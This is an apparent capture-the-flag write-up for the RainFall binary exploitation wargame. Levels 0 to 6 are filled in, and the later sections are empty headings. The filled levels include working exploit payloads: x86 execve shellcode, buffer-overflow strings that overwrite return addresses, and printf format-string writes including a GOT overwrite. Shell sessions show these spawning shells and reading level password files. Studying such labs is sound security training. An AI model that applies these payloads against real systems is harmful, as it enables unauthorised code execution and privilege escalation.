# Table of contents

- [level0](#level0)
  * [Type of exploit](#type-of-exploit)
  * [Details of level0](#details-of-level0)
- [level1](#level1)
  * [Type of exploit](#type-of-exploit-1)
  * [Details of level1](#details-of-level1)
- [level2](#level2)
  * [Type of exploit](#type-of-exploit-2)
  * [Details of level2](#details-of-level2)
- [level3](#level3)
  * [Type of exploit](#type-of-exploit-3)
  * [Details of level3](#details-of-level3)
- [level4](#level4)
  * [Type of exploit](#type-of-exploit-4)
  * [Details of level4](#details-of-level4)
- [level5](#level5)
  * [Type of exploit](#type-of-exploit-5)
  * [Details of level5](#details-of-level5)
- [level6](#level6)
  * [Type of exploit](#type-of-exploit-6)
  * [Details of level6](#details-of-level6)
- [level7](#level7)
  * [Type of exploit](#type-of-exploit-7)
  * [Details of level7](#details-of-level7)
- [level8](#level8)
  * [Type of exploit](#type-of-exploit-8)
  * [Details of level8](#details-of-level8)
- [level9](#level9)
  * [Type of exploit](#type-of-exploit-9)
  * [Details of level9](#details-of-level9)
- [bonus0](#bonus0)
  * [Type of exploit](#type-of-exploit-10)
  * [Details of bonus0](#details-of-bonus0)
- [bonus1](#bonus1)
  * [Type of exploit](#type-of-exploit-11)
  * [Details of bonus1](#details-of-bonus1)
- [bonus2](#bonus2)
  * [Type of exploit](#type-of-exploit-12)
  * [Details of bonus2](#details-of-bonus2)
- [bonus3](#bonus3)
  * [Type of exploit](#type-of-exploit-13)
  * [Details of bonus3](#details-of-bonus3)

# level0
## Type of exploit

Reverse engineering

## Details of level0

There is a call to `atoi()` that awaits a specific value and regular execution of code calls `execv("/bin/sh")`.

# level1
## Type of exploit

Buffer-Overflow of vulnerable function `gets()` + predictability of addresses in the VM.

Overwriting return address with address of uncalled function `run()`.

## Details of level1

`main()` function uses (vulnerable)`gets()` to read stdin. Crashes after 80 characters.

There is an uncalled function in binary (`run()`), that calls a shell.

Its address is found with `info functions` in gdb, address is constant thanks to VM settings (NO ASLR).

We can feed an input to overwrite the return address with the address of `run()` function. 

```shell-session
$ echo -n -e '0000000000000000000000000000000000000000000000000000000000000000000000000000\x44\x84\x04\x08' > injectme
$ cat /tmp/injectme | ./level1
Good... Wait what?
Segmentation fault (core dumped)
$ cat /tmp/injectme - | ./level1

Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

^C
Segmentation fault (core dumped)
```

# level2
## Type of exploit

Heap-based Shellcode Injection + Buffer-Overflow + Runtime Instruction Pointer Overwriting

Use of vulnerable function `gets()`, allocation on the heap of malicious shellcode.

## Details of level2

Program allocates a string on the heap with `strdup()` by reading stdin with `gets()`.

We can predict where the heap starts after the call to `strdup()` thanks to the `info proc mappings` tool of gdb.

We just need to get offset of buffer with pattern generator. (offset of 80 bytes)

Choose working shellcode from Database (28 bytes long), subtract from buffer offset the length of the shellcode to get the length of the padding (80 - 28 = 52)

Send [`shellcode + padding + (starting address of the heap)+8`] to `strdup()` to jump to the shellcode at runtime.

```shell-session
level2@RainFall:~$
(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'thisisjustbutapaddingtoguaranteethatwehaveanoverflow' + '\x08\xa0\x04\x08'"; cat -) | ./level2
1Ph//shh/bin�°
              ̀1@̀thisisjustbutapaddingtoguaranteethveanoverflow
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

# level3
## Type of exploit

Format String Attack: no variadic argument to printf + no sanitization of user-defined conversion string fed to printf allows to print and edit values in memory.

Lack of ASLR makes it easy to find address of a given symbol, namely `m()`.

## Details of level3

Binary naturally opens a shell but an `if` statement prevent us from going there.

There is a comparison between a global symbol (`m()`) and a hardcoded value (`64`). `m()` is outside the control flow, so no register injection here.

Program takes input and gives it to printf, with no other argument.

We can use printf features to edit a given address with an arbitrary value:
- option `$` that is used with an integer i to access the ith argument positionned after printf (`%4$s` will apply `%s` to argument 4) 
- type conversion `%n` that inserts an integer corresponding to the number of bytes written so far in the type conversion format. (`123%2$n` will insert 3 in 2nd argument to printf)

Since we have the address of function `m()`, and we know the position of the format string as argument to printf, we can compose a conversion string to insert an arbitrary value at that specific location:

[`address of m (4 bytes) + %60c (60 bytes) + %4$n`]-> addres of m is now equal to 64
```shell-session
level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08' + '%60c' + '%4\$n'"; cat -) | ./level3

Wait what?!
cat /home/user/$(whoami)/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

# level4

## Type of exploit

Same as level3, except `m` is not a function but a global variable:

Format String Attack: no variadic argument to printf + no sanitization of user-defined conversion string fed to printf allows to print and edit values in memory.

Lack of ASLR makes it easy to find address of a given symbol, namely `m`.

## Details of level4

Same as level3, except the value to insert at the global variable symbol `m` is not `64`(10) but `16930116`(10).

Steps:
1. gets address of `m` (0x08049810)
2. find position of conversion string in arguments to printfs (12th)
3. use `%12$n` and build format string

```shell-session
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112c" + "%12$n"' | ./level4
```

# level5

## Type of exploit

Format String Attack + GOT overwrite

## Details of level5

There is an uncalled function `o()` in the binary that calls a shell.

`main()` calls `p()` which calls `fgets(stdin)` then `printf(user_input)` and then `exit@plt`.

We can use a format string attack to overwrite the address pointed by the pointer the GOT provided with the address of `o()`.

1. get address of `o()` (0x080484a4(16) == 134513828(10))
2. get address of pointer provided by GOT
3. get position of format string in the stack (4)
4. use `%4$n` and build format string.

```shell-session
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"'; cat) | ./level5
[...Huge long string of bytes that prints for tens of seconds...]
_
whoami
level6
cat ~level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

# level6

## Type of exploit

Buffer Overflow + behaviour of Malloc and contiguity of allocated memory chunks + use of strcpy

## Details of level6

`info functions` tells us there are three functions: `n()(0x08048454)`, `m()`, `main()`.

In the main there are two successive calls to `malloc` into two different variables, and a mention of the address of `m()` as well, which address is placed in and called from a register.

`disas n` tells us that there is a call to `system(/bin/cat /home/user/level7/.pass)` inside it, but `n()` is never called.

Since we know the program uses `malloc` successively and calls `strcpy` with `argv[1]` and one of the `malloc-ed pointer`, we can use a `strcpy` vulnerability to overwrite the address of the allocated pointer that is stored in the register, and make it point to `n()`.

```shell-session
level6@RainFall:~$ ./level6 $(python -c 'print "B"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

# level7
## Type of exploit
## Details of level7

# level8
## Type of exploit
## Details of level8

# level9
## Type of exploit
## Details of level9

# bonus0
## Type of exploit
## Details of bonus0

# bonus1
## Type of exploit
## Details of bonus1

# bonus2
## Type of exploit
## Details of bonus2

# bonus3
## Type of exploit
## Details of bonus3

